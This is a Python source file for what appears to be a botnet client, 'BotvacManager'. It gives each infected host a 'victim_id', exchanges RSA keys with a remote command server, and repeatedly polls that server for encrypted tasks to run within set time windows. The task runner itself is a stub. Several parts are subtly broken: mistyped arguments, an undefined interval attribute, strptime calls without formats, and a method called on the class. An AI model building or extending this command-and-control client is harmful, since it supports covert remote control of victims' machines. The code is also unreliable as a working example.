import json
import os
import uuid
from datetime import datetime
from urllib.parse import urljoin

import requests
import rsa
import schedule as schedule

from bot.objects.Logger import Logger
from bot.objects.task import Task, TaskResult


class BotvacManager:
    SERVER_ADDRESS = os.getenv("BOTVAC_SERVER_URL", "https://example.com:443")

    def __init__(self):
        self.last_task: Task = None
        self.victim_id = uuid.uuid4()
        self.reqs_respo = requests.Session()
        self.logger = Logger()
        self.victim_public_key = None
        self.victim_private_key = None
        self.server_public_key = None

    def get_public_key(self):
        self.logger.debug("trying to get server's public key")
        url = urljoin(self.SERVER_ADDRESS, "/get_public_key")
        respo = self.reqs_respo.get(url=url)
        return respo.content

    def generate_keys(self):

        self.server_public_key = self.get_public_key()
        public_key, private_key = rsa.newkeys(512)
        self.victim_public_key = public_key
        self.victim_private_key = private_key

    def update_last_task(self):
        url = urljoin(self.SERVER_ADDRESS, "/update_last_task")
        body = {
            "last_task": self.last_task.task_id,
            "victim_id": self.victim_id
        }
        respo = self.reqs_respo.post(url=url, data=self.encrypt_data(plain_dict=body))
        if respo.status_code == 200:
            self.logger.debug("found new task")
            decrypted_task = self.decrypt_data(encrypted_json=respo.content)
            self.last_task = Task(data=decrypted_task)
            return True
        elif respo.status_code == 304:
            self.logger.debug("no new task")
            return False

    def encrypt_data(self, plain_dict: dict) -> str:
        return str(rsa.encrypt(message=json.dumps(str(plain_dict)), pub_key=self.server_public_key))

    def decrypt_data(self, encrypted_json: str) -> dict:
        return json.loads(rsa.decrypt(crypto=encrypted_json, priv_key=self.victim_private_key))

    def run_last_task(self) -> TaskResult:
        self.logger.warning("Not implemented yet.")
        self.logger.debug(Task.convert_to_dict())
        return TaskResult()

    def _run_task_routine(self):
        self.update_last_task()
        if self.last_task and datetime.strptime(self.last_task.start_time) <= datetime.now() < datetime.strptime(
                self.last_task.end_time):

            self.run_last_task()

    def main(self):
        schedule.every(self.inverval).seconds.do(self._run_task_routine)
        while True:
            schedule.run_pending()
